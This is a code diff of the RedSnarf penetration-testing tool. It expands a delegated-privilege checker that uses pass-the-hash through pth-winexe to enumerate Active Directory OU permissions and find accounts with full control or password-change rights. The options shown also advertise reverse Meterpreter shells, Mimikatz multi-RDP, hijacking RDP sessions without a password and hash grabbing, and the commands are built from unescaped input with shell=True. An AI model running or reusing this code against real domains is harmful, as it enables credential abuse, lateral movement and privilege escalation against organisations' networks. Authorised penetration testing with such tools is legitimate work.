@@ -1870,7 +1870,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4q", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4r", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1900,7 +1900,7 @@ ugroup.add_argument("-uL", "--lockdesktop", dest="lockdesktop", default="", help
 ugroup.add_argument("-uLP", "--liveips", dest="liveips", default="", help="<Optional> Ping scan to generate a list of live IP's")
 ugroup.add_argument("-uM", "--mssqlshell", dest="mssqlshell", default="", help="<Optional> Start MSSQL Shell use WIN for Windows Auth, DB for MSSQL Auth")
 ugroup.add_argument("-uMT", "--meterpreter_revhttps", dest="meterpreter_revhttps", default="", help="<Optional> Launch Reverse Meterpreter HTTPS")
-ugroup.add_argument("-uO", "--delegated_privs", dest="delegated_privs", default="n", help="<Optional> Very Basic Delegated Privilege Checker ")
+ugroup.add_argument("-uO", "--delegated_privs", dest="delegated_privs", default="n", help="<Optional> Delegated Privilege Checker ")
 ugroup.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
 ugroup.add_argument("-uR", "--multi_rdp", dest="multi_rdp", default="n", help="<Optional> Enable Multi-RDP with Mimikatz")
 ugroup.add_argument("-uRP", "--rdp_connect", dest="rdp_connect", default="n", help="<Optional> Connect to existing RDP sessions without password")
@@ -2376,45 +2376,87 @@ elif remotetargets[0:8]=='nmapxml=':
 
 	print colored("[+]Parsed Nmap output and found "+str(len(targets))+" target(s) in xml file\n",'yellow')
 
-
+#Function looks for accounts which have delegated privs
 if delegated_privs in yesanswers:
-	
+	#Setup
 	dirty = "False"
+	username=[]
+	fullnames=[]
+	oulist=[]
 
 	print colored("[+]Getting OU List & Checking for possible Delegated Privileges",'green')
 
+	#Get all OU's available in domain
 	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsquery ou domainroot' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 	tmpoulist = proc.communicate()[0]			
 	
+	#Cycle ou's and get privs
 	for ou in tmpoulist.splitlines():
-		print ou
+		print ou[1:(len(ou)-1)]
 
 		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsacls "+ou+"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 		ouprivs = proc.communicate()[0]	
 
+		#Flag things we're interested in here
 		for line in ouprivs.splitlines():
 			if "SPECIAL ACCESS for user" in line and "Allow BUILTIN" not in line:
 				print colored(line,'yellow')
 				dirty="True"
+				#print line.split(" ")[1]
+				username.append(line.split(" ")[1]+":"+ou[1:(len(ou)-1)])
 			
 			if "FULL CONTROL" in line and "Enterprise Admins" not in line and "NT AUTHORITY\SYSTEM" not in line and "Domain Admins" not in line:
 				print colored(line,'yellow')
 				dirty="True"
+				#print line.split(" ")[1]
+				username.append(line.split(" ")[1]+":"+ou[1:(len(ou)-1)])
+
+	if dirty=="True":
+		print colored("\n[+]Users with interesting privileges...",'yellow')
+		username=list(set(username))
+		for name in username:
+			#print name
+			uname= (name.split(":")[0])
+			#print uname
+			uname= (uname.split("\\")[1])
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C net user "+uname+" /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			fullname = proc.communicate()[0]
 			
+			for info in fullname.splitlines():
+				if "Full Name" in info:
+					if len(info)>29:
+						userfullname=info[29:len(info)]
+						fullnames.append(userfullname)
+						oulist.append((name.split(":")[1]))
+					else:
+						fullnames.append(uname)
+						oulist.append((name.split(":")[1]))
+		
+		for x in xrange(0,len(fullnames)):
+			print "["+str(x)+"] "+fullnames[x]
+
+	#If dirty flag is true we potentially have users with delegated privs we can investigate
 	if dirty=="True":
 		print colored("\n[+]Looks like you have user(s) with delegated privs",'green')
 		response=raw_input("Do you want to view a users privs? (y/n) ")
 		if response=="n":
 			sys.exit()
 		elif response in yesanswers:
-			response1=raw_input("Please enter their username - ")
-			response2=raw_input("Please enter their OU - ")
+			response1=raw_input("Please enter number in [] for user - ")
+			#response2=raw_input("Please enter their OU - ")
 
-			print colored("\n[+]Gathering details for ",'green')+colored(response1,'yellow')
+			print colored("\n[+]Gathering details for ",'green')+colored(fullnames[int(response1)],'yellow')
 
-			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsacls "+"CN="+response1+","+response2+"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'cmd /C dsacls \""+"CN="+fullnames[int(response1)]+","+oulist[int(response1)]+"\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
 			userprivs = proc.communicate()[0]	
-			print userprivs
+			for privs in userprivs.splitlines():
+				if "Change Password" in privs:
+					print colored(privs,'red')
+				else:
+					print privs
+
+	if dirty=="False":
+		print colored("\n[+]No users found with interesting privileges...",'yellow')
 
 	sys.exit()
 
